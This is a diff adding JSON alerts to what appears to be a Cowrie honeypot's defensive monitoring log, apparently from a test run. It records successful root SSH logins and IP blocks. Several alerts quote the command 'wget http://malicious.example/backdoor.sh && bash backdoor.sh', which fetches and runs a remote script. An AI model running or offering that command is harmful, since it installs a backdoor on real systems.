@@ -3319,5 +3319,183 @@
       "command": "wget http://malicious.example/backdoor.sh && bash backdoor.sh",
       "session": "react-ui-test-3d4a8564"
     }
+  },
+  {
+    "alert_id": "ALERT-2026-09-18T12:20:27.167648Z-6668",
+    "timestamp": "2026-09-18T12:20:27.167648Z",
+    "severity": "CRITICAL",
+    "threat_type": "SUCCESSFUL_INTRUSION",
+    "source_ip": "203.0.113.205",
+    "description": "Successful login from 203.0.113.205 to honeypot",
+    "recommended_action": "Immediate response required",
+    "response_actions": [
+      {
+        "action_id": "cowrie-block-203.0.113.205",
+        "timestamp": "2026-09-18T12:20:27.187770",
+        "action_type": "BLOCK_IP_COWRIE",
+        "target": "203.0.113.205",
+        "severity": "CRITICAL",
+        "reason": "Blocked in Cowrie honeypot: Successful intrusion attempt",
+        "status": "success",
+        "details": {
+          "status": "success",
+          "ip": "203.0.113.205"
+        }
+      }
+    ],
+    "attack_details": {
+      "eventid": "cowrie.login.success",
+      "username": "root",
+      "session": "react-ui-test-454df6bb",
+      "protocol": "ssh"
+    }
+  },
+  {
+    "alert_id": "ALERT-2026-09-18T12:21:23.257378Z-7412",
+    "timestamp": "2026-09-18T12:21:23.257378Z",
+    "severity": "HIGH",
+    "threat_type": "MALICIOUS_COMMAND",
+    "source_ip": "203.0.113.135",
+    "description": "Malicious command detected: wget http://malicious.example/backdoor.sh && bash backdoor.sh",
+    "recommended_action": "Block IP and investigate",
+    "response_actions": [
+      {
+        "action_id": "cowrie-block-203.0.113.135",
+        "timestamp": "2026-09-18T12:21:23.275440",
+        "action_type": "BLOCK_IP_COWRIE",
+        "target": "203.0.113.135",
+        "severity": "HIGH",
+        "reason": "Malicious command: wget http://malicious.example/backdoor.sh && bash ",
+        "status": "success",
+        "details": {
+          "status": "success",
+          "ip": "203.0.113.135"
+        }
+      }
+    ],
+    "attack_details": {
+      "eventid": "cowrie.command.input",
+      "command": "wget http://malicious.example/backdoor.sh && bash backdoor.sh",
+      "session": "react-ui-test-83b4a930"
+    }
+  },
+  {
+    "alert_id": "ALERT-2026-09-18T12:22:28.520103Z-5906",
+    "timestamp": "2026-09-18T12:22:28.520103Z",
+    "severity": "HIGH",
+    "threat_type": "MALICIOUS_COMMAND",
+    "source_ip": "203.0.113.159",
+    "description": "Malicious command detected: wget http://malicious.example/backdoor.sh && bash backdoor.sh",
+    "recommended_action": "Block IP and investigate",
+    "response_actions": [
+      {
+        "action_id": "cowrie-block-203.0.113.159",
+        "timestamp": "2026-09-18T12:22:28.538805",
+        "action_type": "BLOCK_IP_COWRIE",
+        "target": "203.0.113.159",
+        "severity": "HIGH",
+        "reason": "Malicious command: wget http://malicious.example/backdoor.sh && bash ",
+        "status": "success",
+        "details": {
+          "status": "success",
+          "ip": "203.0.113.159"
+        }
+      }
+    ],
+    "attack_details": {
+      "eventid": "cowrie.command.input",
+      "command": "wget http://malicious.example/backdoor.sh && bash backdoor.sh",
+      "session": "react-ui-test-fb8619fa"
+    }
+  },
+  {
+    "alert_id": "ALERT-2026-09-18T12:22:45.471175Z-219",
+    "timestamp": "2026-09-18T12:22:45.471175Z",
+    "severity": "CRITICAL",
+    "threat_type": "SUCCESSFUL_INTRUSION",
+    "source_ip": "203.0.113.23",
+    "description": "Successful login from 203.0.113.23 to honeypot",
+    "recommended_action": "Immediate response required",
+    "response_actions": [
+      {
+        "action_id": "cowrie-block-203.0.113.23",
+        "timestamp": "2026-09-18T12:22:45.488548",
+        "action_type": "BLOCK_IP_COWRIE",
+        "target": "203.0.113.23",
+        "severity": "CRITICAL",
+        "reason": "Blocked in Cowrie honeypot: Successful intrusion attempt",
+        "status": "success",
+        "details": {
+          "status": "success",
+          "ip": "203.0.113.23"
+        }
+      }
+    ],
+    "attack_details": {
+      "eventid": "cowrie.login.success",
+      "username": "root",
+      "session": "react-ui-test-1d136a8b",
+      "protocol": "ssh"
+    }
+  },
+  {
+    "alert_id": "ALERT-2026-09-18T12:23:48.216900Z-4131",
+    "timestamp": "2026-09-18T12:23:48.216900Z",
+    "severity": "CRITICAL",
+    "threat_type": "SUCCESSFUL_INTRUSION",
+    "source_ip": "203.0.113.36",
+    "description": "Successful login from 203.0.113.36 to honeypot",
+    "recommended_action": "Immediate response required",
+    "response_actions": [
+      {
+        "action_id": "cowrie-block-203.0.113.36",
+        "timestamp": "2026-09-18T12:23:48.223306",
+        "action_type": "BLOCK_IP_COWRIE",
+        "target": "203.0.113.36",
+        "severity": "CRITICAL",
+        "reason": "Blocked in Cowrie honeypot: Successful intrusion attempt",
+        "status": "success",
+        "details": {
+          "status": "success",
+          "ip": "203.0.113.36"
+        }
+      }
+    ],
+    "attack_details": {
+      "eventid": "cowrie.login.success",
+      "username": "root",
+      "session": "react-ui-test-2b51982a",
+      "protocol": "ssh"
+    }
+  },
+  {
+    "alert_id": "ALERT-2026-09-18T12:24:31.887972Z-219",
+    "timestamp": "2026-09-18T12:24:31.887972Z",
+    "severity": "CRITICAL",
+    "threat_type": "SUCCESSFUL_INTRUSION",
+    "source_ip": "203.0.113.23",
+    "description": "Successful login from 203.0.113.23 to honeypot",
+    "recommended_action": "Immediate response required",
+    "response_actions": [
+      {
+        "action_id": "cowrie-block-203.0.113.23",
+        "timestamp": "2026-09-18T12:24:31.894614",
+        "action_type": "BLOCK_IP_COWRIE",
+        "target": "203.0.113.23",
+        "severity": "CRITICAL",
+        "reason": "Blocked in Cowrie honeypot: Successful intrusion attempt",
+        "status": "success",
+        "details": {
+          "status": "success",
+          "ip": "203.0.113.23"
+        }
+      }
+    ],
+    "attack_details": {
+      "eventid": "cowrie.login.success",
+      "username": "root",
+      "session": "react-ui-test-cbef915a",
+      "protocol": "ssh"
+    }
   }
 ]
